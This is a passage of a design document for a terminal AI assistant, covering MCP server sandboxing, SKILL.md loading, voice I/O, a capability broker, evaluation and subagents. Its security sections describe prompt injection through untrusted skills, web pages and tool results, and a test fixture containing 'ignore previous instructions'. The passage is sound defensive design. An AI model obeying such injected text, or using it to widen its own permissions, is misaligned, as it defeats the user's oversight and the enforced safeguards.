**Swappable backends.** Runners: `npx`, `uvx`, `docker`, `bunx`, prebuilt binary, and
remote HTTP. Runner selection is config, so a security-conscious user can force
`docker` for everything.

**Failure modes / the elephant.** `npx <anything>` executes arbitrary third-party code
with the user's privileges. A project whose selling point is "extremely secure" cannot
also be "curl | node whatever". Therefore:

- Version pinning + integrity hash **MUST** be required for registry refs. No `latest`.
- MCP servers run inside the same sandbox tiers as `exec` (§9.2), default `strict`:
  no host fs beyond a declared scratch dir, no net beyond `allow_net`.
- The install flow shows a **provenance card**: publisher, downloads, last publish
  date, transitive dep count, whether it requests net/fs, and whether it is on our
  curated list. Explicit human confirmation, always. Not skippable by the model —
  `mcp.install` is not a tool the model can call. `[R-01]`
- A `mcp.lock` file records exactly what is installed; `asst mcp verify` re-checks
  integrity on every start.

**Testing.** A mock MCP server exercising protocol edge cases (huge results,
notifications mid-call, server-initiated sampling requests, unicode, slow start).
Integration tests against 5 pinned real servers in CI nightly, not per-PR.

**Open questions.** `[OQ-09]` MCP `sampling` (server asks *us* to call the model) —
support in v1? It is a capability-escalation vector and few servers use it.
*(Position: reject sampling requests in v1, log them, revisit.)*
`[OQ-10]` MCP roots and resource subscriptions — v1 or v2?

---

### 5.8 `assistance-skills`

**Purpose.** Load the `SKILL.md` ecosystem: frontmatter + body + bundled scripts and
references, with progressive disclosure so 60 skills cost ~2k tokens, not ~200k.

**Public interface.**
```go
type Loader interface {
    Discover(roots ...string) ([]Skill, Diagnostics)
    Index(skills []Skill) string           // the short catalogue injected in the system prompt
    Open(name string) (Body, error)        // full SKILL.md, on demand
    Tools(s Skill) []core.Tool             // bundled executables, if any
}
type Skill struct {
    Name, Description string
    Path      string
    Frontmatter map[string]any
    Files     []string          // sibling references, scripts, templates
    Requires  []core.Capability
}
```

**Depends on.** `core`, `security`, `tools`.

**Three-level disclosure** (matching how the ecosystem already works):
1. **Always in context:** name + description, one line each. ~30 tokens per skill.
2. **On demand:** the model calls `skill.open("pptx")` → full `SKILL.md` body.
3. **Referenced:** body points at `reference.md`, `scripts/build.py` etc.; the model
   reads them with `fs.read` or runs them with `exec`.

**Configuration.**
```toml
[skills]
roots = ["~/.assistance/skills", "./.assistance/skills", "/usr/share/assistance/skills"]
autoload = true
[skills.trust]
"~/.assistance/skills" = "user"     # user | vendor | untrusted
"./.assistance/skills" = "untrusted" # a repo you cloned can contain a SKILL.md
```

**The trust point that is easy to miss.** A `SKILL.md` in a cloned repository is
attacker-controlled text that ends up in the system prompt. Workspace-local skills are
`untrusted` by default: they load only after explicit user approval, they are rendered
inside a delimiter block marked as untrusted content, and they **cannot** declare
capabilities. `[R-02]`

**Failure modes.** Malformed frontmatter → skill is skipped with a diagnostic, never
fatal. Duplicate names → workspace beats user beats system, with a visible warning.

**Testing.** Fixture corpus of real-world `SKILL.md` files including deliberately
malformed and adversarial ones ("ignore previous instructions" in a description).

**Open questions.** `[OQ-11]` Do skills get their own capability grants, or do they
inherit the session's? *(Position: inherit and never widen; a skill may *narrow*.)*

---

### 5.9 `assistance-cli` (TUI)

**Purpose.** The Bubble Tea application. Renders state, captures input, and nothing
else — it holds no business logic.

**Public interface.**
```go
type App struct{ … }
func New(bus core.Bus, cmds CommandSink, cfg UICfg) *App
func (a *App) Run(ctx context.Context) error
// Elm architecture; every external input arrives as a tea.Msg wrapping a core.Event.
```

**Depends on.** `core`, `config`. **Not** `brain`, **not** `ai`. It sends
`core.Command` values into a sink and renders `core.Event`s out of the bus. This is
what makes a future `asst --headless` or a web frontend a 200-line addition rather
than a rewrite.

**Architecture inside Bubble Tea.**
- One `tea.Model` root, composed of `viewport`, `textarea`, `list`, and custom
  components (status bar, tool card, palette, modal stack).
- **Rule:** `Update` **MUST** be non-blocking. Anything that can take > 1 ms is a
  `tea.Cmd` returning a message. No mutexes in `Update`.
- **Token coalescing.** Streaming at 80 tok/s with a re-render per token will burn CPU
  and tear. A `coalescer` batches `TokenStreamed` on a 33 ms tick (30 fps) and emits
  one `renderMsg`. Non-negotiable — this is the single most common performance bug in
  streaming TUIs. `[R-07]`
- **Reflow.** Chat history is stored as source, re-wrapped on resize, never stored
  pre-wrapped. Markdown via `glamour`, but with a plain-text fallback flag because
  `glamour` re-rendering large histories on every resize is slow. Cache per-message
  rendered output keyed by `(msgID, width, theme)`.
- **Modal stack** for approvals so a tool approval during a voice interaction doesn't
  fight the palette for focus. Exactly one component has focus; focus is explicit
  state in the root model, not implied.

**Configuration.**
```toml
[ui]
theme          = "auto"     # auto | dark | light | high_contrast | mono
markdown       = true
fps            = 30
show_reasoning = "collapsed"  # off | collapsed | expanded
timestamps     = false
mouse          = true
```

**Swappable backends.** Renderers: `tui` (default), `plain` (pipe-friendly, for
`asst -p "…" | jq`), `json` (event stream on stdout for scripting/eval).

**Failure modes.** Terminal without 256 colours / without altscreen / inside `tmux`
with mouse capture / width < 60. Degrade, never crash. A panic in `View` must be
recovered, restore the terminal, and print the trace — a wedged terminal is the worst
possible failure for a CLI tool.

**Testing.** `teatest` golden-frame tests at widths 60/80/120/200. A "chaos" test that
replays a recorded event stream at 10× speed and asserts no dropped frames or panics.

**Open questions.** `[OQ-12]` Do we support scrollback-friendly inline mode (append to
terminal scrollback, no altscreen) in addition to full-screen? *(Position: yes,
`ui.altscreen = false`; some users strongly prefer it, and it is cheap if the renderer
is already an interface.)*

---

### 5.10 `assistance-voice-in` (capture / STT)

**Purpose.** Turn speech into text with low latency and good barge-in behaviour.

**Public interface.**
```go
type Capturer interface {
    Start(ctx context.Context) (<-chan Segment, error)  // VAD-delimited
    Mode() CaptureMode                                   // ptt | vad | wake
}
type Transcriber interface {
    Transcribe(ctx context.Context, audio []byte, hint Hint) (Transcript, error)
    Stream(ctx context.Context, in <-chan []byte) (<-chan Partial, error) // optional
}
```

**Pipeline.** `device → resample 16 kHz mono → VAD (Silero/WebRTC) → segment → STT →
punctuate → dispatch`. Partials render greyed in the input box; the final replaces it.

**Depends on.** `core`, `config`, `security` (mic is a capability: `audio.capture`).

**Configuration.**
```toml
[voice.input]
enabled   = true
mode      = "ptt"                # ptt | vad | wake
ptt_key   = "ctrl+space"
backend   = "whisper_cpp"
model     = "~/.assistance/models/ggml-large-v3-turbo-q5_0.bin"
language  = "auto"
device    = "default"
vad       = { backend = "silero", threshold = 0.5, silence_ms = 700 }
```

**Swappable backends.** `whisper_cpp` (local, CGO), `whisper_server` (local HTTP —
**the default**, see below), `openai` (hosted `/v1/audio/transcriptions`), `deepgram`,
`groq`. Hosted backends reuse `assistance-ai`'s HTTP plumbing and auth but are
separate interfaces — transcription is not chat completion, and pretending otherwise
would contort both. *(This answers the brief's question directly: share the transport
and auth layer, not the interface.)*

**Failure modes / the CGO problem.** `whisper.cpp` bindings mean CGO, which destroys
`CGO_ENABLED=0` cross-compilation and turns "download one static binary" into a
platform matrix. **Decision:** the default local backend is `whisper_server` — we
speak HTTP to a `whisper.cpp`/`faster-whisper` server process that onboarding
installs. Pure-Go main binary preserved. `whisper_cpp` in-process is a build tag
(`-tags cgo_whisper`) for people who want it. `[R-10]`

Audio device access on Linux is a genuine mess (ALSA/PulseAudio/PipeWire). Use
`malgo` (miniaudio) — also CGO, so audio I/O lives in a **separate helper process**
`asst-audio` that the main binary spawns and talks to over a pipe. This keeps CGO out
of the main binary entirely and means an audio driver segfault does not take down the
session. `[OQ-13]` confirms this is worth the IPC.

**Testing.** WER on a fixed 50-utterance corpus per backend, tracked in the eval
scorecard. Latency budget test: end-of-speech → transcript ≤ 400 ms p50 local.

**Open questions.** `[OQ-13]` helper process vs build tags for audio. `[OQ-14]` Wake
word — Porcupine is proprietary, openWakeWord is Python. Ship `ptt` and `vad` in v1,
wake word deferred.

---

### 5.11 `assistance-voice-out` (synthesis)

**Purpose.** Speak *selectively* and quickly.

**The core idea (from the brief), made concrete.** Reading the full transcript aloud is
what makes existing voice agents unbearable — nobody wants 400 words of code diff
read to them. Instead the model designates what is spoken.

**Mechanism — dual-channel with a fallback.** The naive version is inline tags:

```
Here's what I found. <speak>Three tests are failing, all in the auth package.</speak>
[400 lines of diff]
```

This works, and the streaming parser is simple. But it depends on model compliance,
and small local models will not comply reliably. So the design is **layered**:

| Tier | Mechanism | Used when |
|---|---|---|
| 1 | Native structured output — a `speech` field in a JSON-schema-constrained response | provider supports `json_schema` |
| 2 | Inline `<speak>…</speak>` markers, extracted by a streaming parser | provider supports tool/tag following |
| 3 | **Fallback summariser** — a cheap second call: "one sentence, spoken aloud, of the following" | model emitted no speech markers and `voice.fallback = true` |
| 4 | Silence + a UI hint "🔇 nothing to speak" | fallback disabled |

Tier 3 is what makes this actually work with a 7B local model, and it is cheap
(routes to `provider.routing.summarize`). Without it the feature is fragile.
This is a substantive gap in the original sketch. `[R-11]`

**Public interface.**
```go
type Synthesizer interface {
    Speak(ctx context.Context, text string, opt Opts) (Audio, error)
    Stream(ctx context.Context, in <-chan string) (<-chan []byte, error) // sentence-level
    Voices(ctx context.Context) ([]Voice, error)
}
type Player interface {
    Enqueue(Audio, Priority) 
    Stop()          // barge-in
    Duck(bool)      // lower volume while user speaks
}
```

**Streaming granularity.** Synthesise per *sentence*, not per full response — first
audio starts while the model is still generating. Sentence splitting must handle
abbreviations and code; a bad splitter produces "Dot. Dot. Dot." artefacts.

**Barge-in.** If `voice-in` detects speech while playing, `Player.Stop()` immediately
and mark the interrupted text in the transcript so the model knows the human did not
hear the rest. This is a correctness issue, not a polish issue.

**Configuration.**
```toml
[voice.output]
enabled   = true
backend   = "piper"
voice     = "en_GB-alba-medium"
speed     = 1.05
mode      = "selective"          # selective | full | off
fallback  = true                 # tier-3 summariser
max_chars = 600                  # never speak more than this per turn
duck      = true
```

**Swappable backends.** `piper` (local, fast, decent), `kokoro`, `xtts`,
`elevenlabs`, `openai_tts`, `system` (`say`/`espeak`, always-available fallback).

**Failure modes.** TTS failure **MUST NOT** fail the turn. Log, show a muted icon,
continue. Audio queue is bounded; if the model somehow produces 10 minutes of speech,
drop with a notice rather than queueing.

**Testing.** Latency budget: first audible sample ≤ 500 ms after speech text is
final (piper local). Deterministic tests use a null player that records timings.

**Open questions.** `[OQ-15]` Should tool results be able to speak (`Result.Speech`)?
It is in the interface. Risk: a chatty MCP server becomes annoying. *(Position: yes,
but rate-limited to one per turn and off by default.)*

---

### 5.12 `assistance-security`

**Purpose.** Make the guarantee real: *if a capability is not granted, the effect does
not occur, no matter what the model outputs.*

**Public interface.**
```go
type Policy interface {
    Evaluate(ctx context.Context, req Request) Decision  // Allow | Ask | Deny
    Explain(req Request) string                          // human-readable rule trace
}
type Broker interface {
    OpenFile(ctx context.Context, tok Token, path string, mode Mode) (File, error)
    Exec(ctx context.Context, tok Token, spec ExecSpec) (Process, error)
    Dial(ctx context.Context, tok Token, network, addr string) (net.Conn, error)
    Secret(ctx context.Context, tok Token, ref string) (string, error)
}
type Capability struct {
    Kind  Kind      // fs.read fs.write exec net.http audio.capture audio.play secret
    Scope string    // glob, host pattern, argv-0 allowlist, or secret name
    TTL   time.Duration
}
```

#### 5.12.1 Enforcement, not persuasion

Three independent layers, each sufficient alone for its class of threat:

1. **Grant** — the session holds a capability set. The model never sees the tokens.
2. **Policy** — evaluated in the broker on every call, against the *resolved* effect
   (post-symlink, post-`..`, absolute path), not the model's stated intent.
3. **Sandbox** — the OS enforces it anyway: Landlock + seccomp + namespaces (Linux),
   `sandbox-exec` profile (macOS). Even a broker bug is contained.

The failure mode we are explicitly designing against: *"the model was told not to, but
did."* Under this design, a model that emits `fs.write /etc/passwd` produces a
`PolicyDenied` event and a tool error string. The `openat(2)` never happens.

#### 5.12.2 Default profiles

| Profile | fs.read | fs.write | exec | net | Use |
|---|---|---|---|---|---|
| `paranoid` | workspace | none | none | none | reading/reviewing |
| `default` | workspace + `~/.assistance` | workspace | allowlist, sandboxed | allowlist hosts | day-to-day |
| `dev` | home minus secrets | workspace + `/tmp` | any, sandboxed | any, logged | active coding |
| `yolo` | host | host | host, unsandboxed | any | requires `--i-understand`, shows a permanent red banner, disables voice-only mode |

`yolo` exists because it will otherwise be reimplemented badly by users. It is loud.

#### 5.12.3 Secret hygiene

Secrets resolve **inside the broker** and are injected into child process
environments there. They never enter the TUI process memory, never enter the model
context, and are redacted from traces by a scanner that runs on every event before it
hits the bus or disk. Redaction is by *value* (we know the secret strings) plus
pattern (common key formats).

#### 5.12.4 Prompt-injection posture

Untrusted content (fetched web pages, file contents, MCP tool results, workspace
`SKILL.md`) is:
- wrapped in delimiters marked untrusted in the prompt;
- **never** able to change capability grants;
- flagged so that a tool call *originating* in the same step as untrusted intake
  escalates its approval mode by one level (`auto` → `ask`).

That last rule is the cheapest high-value mitigation available and is not in the
original sketch. `[R-12]`

#### 5.12.5 Performance

Read-heavy workloads (grep across a repo) can't afford IPC per file. The broker
issues a **scoped fd-set**: for a directory grant, it passes a directory file
descriptor over the Unix socket (`SCM_RIGHTS`) and the tool uses `openat` relative to
it. The kernel enforces the boundary; no per-file IPC. Writes and exec always go
through the full path.

**Failure modes.** Broker unreachable → **fail closed**, every tool errors, UI shows a
red bar. There is no degraded mode where enforcement is skipped.

**Testing.** §9.4 red-team suite. Plus: a property test that for any random capability
set and any random tool call, `Broker` performs an effect **iff** `Policy` allows it.

**Open questions.** `[OQ-16]` Landlock requires kernel ≥ 5.13, absent on some distros
and in some containers. Fallback: bubblewrap if present, else refuse to run outside
`paranoid`? *(Position: yes, refuse — and say why clearly.)*

---

### 5.13 `assistance-eval`

**Purpose.** Know whether it is getting better or worse. Four distinct jobs that are
often conflated:

| Job | Question | Mechanism |
|---|---|---|
| **Observability** | what happened? | OTel-compatible traces, every event, `asst trace <turn>` |
| **Regression** | did we break it? | cassette replay, deterministic, runs per-PR |
| **Capability** | is it good? | scenario suites with rubric grading (LLM-as-judge + assertions) |
| **Safety** | can it be made to misbehave? | red-team suite (§9.4), zero-tolerance gate |

**Public interface.**
```go
type Recorder interface{ Record(core.Event) }               // → trace file
type Cassette interface{ Replay(ctx) (core.Bus, error) }     // deterministic re-run
type Scenario struct {
    Name       string
    Setup      Fixture          // workspace tree, config, capability set
    Input      []Turn
    Assertions []Assertion      // file state, tool calls made/not made, cost, latency
    Rubric     string           // optional LLM-judged qualities
}
```

**Trace format.** One JSONL file per session under `~/.assistance/traces/`, plus OTel
export if configured. Every event carries `turn_id`, `step_id`, `call_id`, so a trace
reconstructs the full causal tree. Traces are redacted (§5.12.3) and the user can
`asst trace export --scrub` to share one in a bug report.

**Determinism.** The hard part. We record: provider responses, tool results, clock,
random seeds, and MCP server outputs. `ReplayBrain` + `CassetteProvider` reproduce a
turn exactly. Without this, "did we regress?" is unanswerable and every eval run costs
money and takes minutes.

**Scorecard** (`asst eval run --suite core`) reports: task success rate, guardrail
violations (must be 0), mean steps per task, mean cost, p50/p95 latency, tool error
rate, STT WER, TTS latency, and context-compaction frequency.

**Configuration.**
```toml
[eval]
traces      = true
trace_dir   = "~/.assistance/traces"
otel        = { enabled = false, endpoint = "" }
judge       = "cloud"           # provider profile used for rubric grading
```

**Failure modes.** Tracing must never slow the hot path: recorder writes to a buffered
channel, drops with a counter under pressure, and fsyncs on turn boundaries only.

**Testing.** The eval framework has its own tests. Meta, but a broken judge silently
passing everything is the worst outcome — include known-bad fixtures that MUST fail.

**Open questions.** `[OQ-17]` Do we adopt an external benchmark (SWE-bench-lite,
τ-bench) or only home-grown scenarios? *(Position: home-grown for v1 — external
benchmarks measure a coding agent, and this is a personal assistant. Add τ-bench-style
tool-use scenarios in v1.1.)*

---

### 5.14 `assistance-swarm` (multi-agent)

**Purpose.** Orchestrate subagents, without becoming a distributed systems project.

**Public interface.**
```go
type Swarm interface {
    Spawn(ctx context.Context, spec AgentSpec) (core.Tool, error) // subagent IS a tool
    Active() []AgentStatus
}
type AgentSpec struct {
    Name        string
    Persona     string
    Provider    string           // may differ — cheap model for grunt work
    Tools       []string         // MUST be a subset of parent's
    Caps        []core.Capability// MUST be a subset of parent's — enforced, not advised
    MaxSteps    int
    MaxCost     Cost
    Isolation   Isolation        // shared_workspace | scratch_copy | readonly
}
```

**Topology for v1: supervisor–worker only.** One parent, N children, results return to
the parent. No peer-to-peer messaging, no shared blackboard, no dynamic re-planning
across agents. Those are v2 and each is a research project. Shipping a working
subagent tool beats shipping a half-working swarm.

**The capability rule that matters.** Child capabilities are the **intersection** of
requested and parent-held, always. A subagent can never do something its parent could
not. This must be enforced in the broker at token-derivation time, not checked in
`Spawn`. Get this wrong and multi-agent becomes a privilege-escalation feature. `[R-13]`

**Configuration.**
```toml
[swarm]
enabled       = false          # exp_swarm
max_concurrent = 3
default_isolation = "scratch_copy"
[[swarm.agents]]
name = "researcher"
provider = "local"
tools = ["fetch", "fs.read", "grep"]
max_cost = 0.10
```

**Failure modes.** Runaway spawn (agent spawns agents spawns agents): hard depth limit
of 2 in v1, and total-cost budget shared across the tree, decremented atomically.
Orphaned children on parent cancellation: context propagation, plus a reaper.

**Testing.** Deterministic multi-agent replay is hard because of concurrency —
subagent execution is serialised in eval mode via a `deterministic = true` flag.

**Open questions.** `[OQ-18]` Do subagents get their own TUI panes, or only a
collapsed progress card in the parent's stream? *(Position: collapsed card, expandable;
panes are a v2 layout problem.)*

---

### 5.15 `assistance-session` *(added — not in the original brief)*

**Purpose.** Persist, resume, branch, and export conversations. Called out because
without it, a crash 40 minutes into a task loses everything, and the eval module has
nothing to replay.

**Public interface.**
```go
type Store interface {
    Create(meta Meta) (ID, error)
    Append(id ID, e core.Event) error
    Load(id ID) (Snapshot, error)
    Fork(id ID, atTurn ID) (ID, error)
    List(filter Filter) []Meta
}
```

**Depends on.** `core`, `security` (session files are secrets-adjacent).

**Configuration.** `[session] backend = "sqlite"`, `dir`, `retention = "90d"`,
`redact = true`.

**Swappable backends.** `sqlite` (default), `jsonl` (grep-friendly), `memory` (tests).

**Failure modes.** Append is fire-and-forget on the hot path with a WAL; a corrupt
session must load partially rather than not at all.

**Testing.** Crash-injection: kill -9 mid-turn, assert resume produces a coherent state.

**Open questions.** `[OQ-19]` Encryption at rest for session files — opt-in or default?

---

## 6. Cross-cutting design

### 6.1 Capability flow

```
onboarding ──grants──► session capability set (held by broker)
                                │
                     derive (narrowing only)
                                ├──► turn token  (TTL = turn)
                                │        └──► tool token (TTL = call, scope ∩ tool.Requires)
                                └──► subagent token (⊆ parent)
```
Tokens are opaque, unforgeable (HMAC over broker-held key), short-lived, and never
serialised into the model context or the trace.

### 6.2 Error taxonomy

Every module maps failures into: `Denied`, `Unsupported`, `Invalid`, `NotFound`,
`Transient`, `Exhausted` (budget), `Interrupted`, `Internal`. The brain has one
policy table for what to do with each — retry, re-ask the model, ask the human, or
stop. Ad-hoc error strings crossing module boundaries are a review blocker.

### 6.3 Cancellation

`Ctrl-C` / `Esc` must stop everything within **200 ms**: context cancellation
propagates to the provider stream, running tools, subagents, and TTS playback. Every
`Tool.Invoke` is contract-tested for this. Partial tool results are returned to the
model marked `interrupted: true` so the next turn has honest state.

### 6.4 Human-in-the-loop as a first-class state

The brief asks for the user to be central "unless given otherwise." Implementing this
as a prompt instruction is unreliable. Instead:

- `ask_user` is a **core tool**, always available, never deniable.
- `ToolIO.Ask` lets a tool block mid-execution (the bot-check case: `fetch` hits a
  CAPTCHA → `Ask("I hit a bot check at example.com — solve it in your browser and
  paste the cookie, or tell me to skip")`).
- The brain enters an explicit `AwaitingHuman` state. The TUI renders it. The session
  persists it — you can quit, come back tomorrow, and answer.
- Config sets autonomy level:
  ```toml
  [autonomy]
  level = "collaborative"   # supervised | collaborative | autonomous
  # supervised   : approve every tool call
  # collaborative: approve writes/exec; ask on ambiguity; default
  # autonomous   : approve only policy-escalating calls; ask on blockers
  ask_timeout = "0s"        # 0 = wait forever
  ```
- **Ambiguity detection:** the brain asks the human when (a) a tool returns
  `Invalid` twice on the same goal, (b) the model's own confidence marker is low,
  (c) an irreversible action is proposed (delete, force-push, payment), or (d) the
  step budget is 80% consumed. `[OQ-20]` — (b) needs a mechanism; possibly a required
  `confidence` field in structured output.

**Irreversibility classification.** Tools declare `Reversible bool`. Irreversible
actions escalate to `ask` regardless of profile. Cheap, effective.

---

## 7. User interface

Sizes below assume an 80×24 minimum. All mockups degrade to 60 columns.

### 7.1 Onboarding

Six steps, resumable, each skippable with a sane default. Runs on first launch or
`asst init`.

```
┌─ assistance · setup ─────────────────────────────────────── step 2 of 6 ─┐
│                                                                          │
│   ●───●───○───○───○───○     provider · voice · tools · mcp · security · done
│                                                                          │
│   Choose your model provider                                             │
│                                                                          │
│   ▸ ◉  Local (Ollama)          detected at 127.0.0.1:11434    ✓ 3 models │
│     ○  Local (llama.cpp)       not detected                              │
│     ○  OpenAI                  needs API key                             │
│     ○  Custom OpenAI-compatible endpoint                                 │
│                                                                          │
│   Model    ▾ qwen3:14b-instruct                                          │
│   Context    32768 tokens        Tool calling  ✓ supported               │
│                                                                          │
│   ┌ test ──────────────────────────────────────────────────────────────┐ │
│   │ ✓ reachable (34 ms)   ✓ streaming   ✓ tool call   ⚠ vision: no     │ │
│   └────────────────────────────────────────────────────────────────────┘ │
│                                                                          │
│   [ tab ] next field   [ enter ] continue   [ ← ] back   [ ^c ] quit     │
└──────────────────────────────────────────────────────────────────────────┘
```

```
┌─ assistance · setup ─────────────────────────────────────── step 5 of 6 ─┐
│                                                                          │
│   Security profile                                                       │
│                                                                          │
│   ▸ ◉  default    read workspace · write workspace · exec allowlist      │
│     ○  paranoid   read workspace · no write · no exec · no network       │
│     ○  dev        read home · write workspace+tmp · exec sandboxed       │
│     ○  yolo       ⚠  no restrictions — requires --i-understand           │
│                                                                          │
│   Workspace root   ~/code/current-project                        [edit]  │
│                                                                          │
│   ┌ what this means ───────────────────────────────────────────────────┐ │
│   │  The agent CAN     read and write under ~/code/current-project     │ │
│   │                    run: git, go, rg, ls, cat, npm, python3         │ │
│   │                    reach: api.github.com, pkg.go.dev               │ │
│   │  The agent CANNOT  touch ~/.ssh, ~/.aws, or anything outside the   │ │
│   │                    workspace — these are enforced by the OS, not   │ │
│   │                    by asking the model politely.                   │ │
│   └────────────────────────────────────────────────────────────────────┘ │
│                                                                          │
│   Sandbox backend   landlock+seccomp   ✓ available (kernel 6.8)          │
└──────────────────────────────────────────────────────────────────────────┘
```

MCP install step, showing the provenance card required by §5.7:

```
┌─ install MCP server ─────────────────────────────────────────────────────┐
│  @modelcontextprotocol/server-github @ 0.6.2                             │
│                                                                          │
│  publisher   modelcontextprotocol  (verified)                            │
│  published   3 weeks ago      downloads  412k/week      deps  14         │
│  integrity   sha512-9f3a…c21     ✓ matches lockfile                      │
│                                                                          │
│  requests    network → api.github.com                                    │
│              secret  → GITHUB_TOKEN                                      │
│              filesystem → none                                           │
│  provides    28 tools   ·   3 prompts   ·   0 resources                  │
│                                                                          │
│  sandbox     strict  (no host fs, net limited to api.github.com)         │
│                                                                          │
│  ⚠ This runs third-party code on your machine.                           │
│                                                                          │
│              [ i ] inspect tools    [ y ] install    [ n ] cancel        │
└──────────────────────────────────────────────────────────────────────────┘
```

### 7.2 Main interface

```
┌ assistance ─ ada ────────────────────────────────────────────────────────────────┐
│ ◉ qwen3:14b local  │ ctx ████████░░ 24.1k/32k  │ $0.00  │ 🔒 default  │ 🎙 ptt ⏻ │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  you  ·  09:41                                                          [voice]  │
│  can you check why the auth tests are failing and fix it                         │
│                                                                                  │
│  ada  ·  09:41                                                                   │
│  Let me look at the test output first.                                           │
│                                                                                  │
│  ┌─ exec ───────────────────────────────────────────────────── 1.2s ── ✓ ──┐    │
│  │ $ go test ./internal/auth/...                                            │    │
│  │ --- FAIL: TestTokenExpiry (0.00s)                                        │    │
│  │     token_test.go:44: expected 401, got 200                              │    │
│  │ FAIL  github.com/org/app/internal/auth   0.113s                          │    │
│  │ … 12 more lines                                                 [ ^o ]   │    │
│  └──────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  ┌─ grep ───────────────────────────────────────────────────── 0.1s ── ✓ ──┐    │
│  │ "ExpiresAt" in ./internal/auth  ·  4 matches in 2 files                  │    │
│  └──────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  The comparison uses `>` where it should be `>=`, so a token expiring exactly    │
│  now is still accepted. One line in `token.go:88`.                               │
│                                                                                  │
│  ┌─ fs.edit ─ internal/auth/token.go ──────────────────── ⏸ approval ──────┐    │
│  │  88 - if time.Now().Before(t.ExpiresAt) {                                │    │
│  │  88 + if time.Now().Before(t.ExpiresAt) && !t.ExpiresAt.Equal(now) {      │    │
│  │                                                                          │    │
│  │  capability  fs.write:~/code/app/**   ✓ granted                          │    │
│  │  reversible  yes (git-tracked, clean tree)                               │    │
│  │                                                                          │    │
│  │  [ y ] approve   [ a ] always for fs.edit   [ e ] edit   [ n ] deny      │    │
│  └──────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
├──────────────────────────────────────────────────────────────────────────────────┤
│ › _                                                                              │
├──────────────────────────────────────────────────────────────────────────────────┤
│ ⚙ 3 tools · 2 mcp · 11 skills │ step 4/40 │ ^space talk  / cmds  ^t tools  ? help│
└──────────────────────────────────────────────────────────────────────────────────┘
```

Header fields, left to right: provider health + model + locality, context usage,
session spend, security profile, voice state. Footer: active capability counts,
step budget, keybind hints. Every one of these is driven by a bus event (§4.5).

### 7.3 Progressive state indication

The requirement "users always know what is going on" maps to a fixed set of states,
each with a distinct, non-ambiguous rendering. Spinner-for-everything is the failure
mode to avoid.

```
  ⠋ thinking                         model is generating, no tokens yet
  ⠙ thinking · 1.4s · 240 tok        generating, with live counters
  ▌ writing…                          streaming text (cursor block, no spinner)
  ⠹ exec · go test ./…  · 4.1s        tool running, elapsed, cancellable [esc]
  ▰▰▰▰▰▱▱▱ fetch 61% · 2.1 MB         tool reporting progress
  ⏸ waiting for you                   approval modal open
  ❓ needs your input                  ask_user — see the question below
  🎙 listening ▁▂▅▇▅▂▁                  capturing, live level meter
  ✎ transcribing…                     STT running
  🔊 speaking ⏹ esc to interrupt       TTS playing, barge-in available
  ⟳ compacting context 24k → 9k       summarising, explains a pause
  ⚠ github mcp reconnecting (2/3)     degraded, not fatal
  ⛔ denied: fs.write /etc/hosts       policy blocked — shown in full, never hidden
```

Rules: **(a)** an elapsed timer appears after 800 ms on any state; **(b)** any state
lasting > 5 s must show what it is waiting on; **(c)** `esc` cancels whatever is
current and the UI says what it cancelled; **(d)** denials are never collapsed or
soft-pedalled — a blocked action is information the user needs.

### 7.4 Slash command palette

Triggered by `/` at the start of an empty input. Fuzzy-filtered, arrow-navigable,
sourced from built-ins + skills + MCP prompts.

```
│  ┌──────────────────────────────────────────────────────────────────────┐
│  │  / mo                                                                │
│  ├──────────────────────────────────────────────────────────────────────┤
│  │  ▸ /model            switch provider or model             built-in   │
│  │    /mcp              manage MCP servers                   built-in   │
│  │    /mode             set autonomy level                   built-in   │
│  │    /commit           write a commit message           skill:git-flow │
│  ├──────────────────────────────────────────────────────────────────────┤
│  │  switch provider or model                                            │
│  │  usage: /model [profile|name]        aliases: /m                     │
│  ├──────────────────────────────────────────────────────────────────────┤
│  │  ↑↓ navigate    ⏎ select    tab complete    esc close    ^d docs     │
│  └──────────────────────────────────────────────────────────────────────┘
│  › /mo_
```

Selecting a command with arguments opens an inline argument form rather than
requiring the user to remember syntax:

```
│  ┌─ /model ─────────────────────────────────────────────────────────────┐
│  │   ▸ ◉ local     qwen3:14b        ollama · 127.0.0.1     ~30 tok/s    │
│  │     ○ local     llama3.3:70b     ollama · 127.0.0.1     ~8 tok/s     │
│  │     ○ cloud     gpt-5            openai                 $2.50/Mtok   │
│  │     ○ cloud     claude-opus-5    via proxy              $5.00/Mtok   │
│  │                                                                      │
│  │   ⓘ switching mid-session keeps context (24.1k tokens will be resent)│
│  └──────────────────────────────────────────────────────────────────────┘
```

**Built-in commands (v1):** `/model` `/persona` `/mode` `/tools` `/mcp` `/skills`
`/security` `/context` `/compact` `/voice` `/trace` `/cost` `/new` `/resume` `/fork`
`/export` `/eval` `/help` `/quit`.

### 7.5 Other required screens

- **Tools inspector** (`^t`) — tree by source, per-tool schema, capability, approval
  mode, invocation count this session, toggle enable.
- **Ask-user modal** — the blocking question, with free-text, choice, and
  file-picker variants; shows *which tool* is asking and *why*.
- **Trace viewer** (`/trace`) — collapsible causal tree of the current turn: steps,
  tool calls, tokens, cost, policy decisions.
- **Context inspector** (`/context`) — what is actually in the window right now,
  by segment, with token counts. Most agent CLIs hide this; it is the single most
  useful debugging view.

---

## 8. Repository layout and build

**One Go module** (`module github.com/<org>/assistance`, D-01). Separation comes from
feature packages plus a machine-enforced import graph, not from `go.mod` boundaries.

```
assistance/
├─ go.mod                          ← exactly one
├─ deps.yaml                       ← the import allowlist; CI fails on violation
├─ cmd/
│  ├─ asst/                        composition root ONLY — wiring, flags, no logic
│  ├─ asstd-broker/                privileged effect broker (§4.4)
│  └─ asst-audio/                  CGO audio helper (§5.10)
├─ internal/                       ← everything not part of the extension contract
│  ├─ brain/            agent loop
│  ├─ cli/              bubbletea TUI
│  │   ├─ components/   statusbar, toolcard, palette, modal, meter
│  │   ├─ screens/      onboarding, main, inspector, trace
│  │   └─ theme/
│  ├─ ai/               provider transport
│  ├─ tools/            registry
│  ├─ coretools/        read write edit glob grep exec fetch ask_user memory
│  ├─ mcp/              generic client + supervisor (no per-server code, D-02)
│  ├─ skills/           SKILL.md loader
│  ├─ security/         policy, capabilities, sandbox, broker client
│  ├─ voicein/          capture, vad, stt backends
│  ├─ voiceout/         synth backends, player, speech extraction
│  ├─ session/          persistence
│  ├─ eval/             traces, cassettes, scenarios, scorecard
│  └─ swarm/            subagents
├─ pkg/
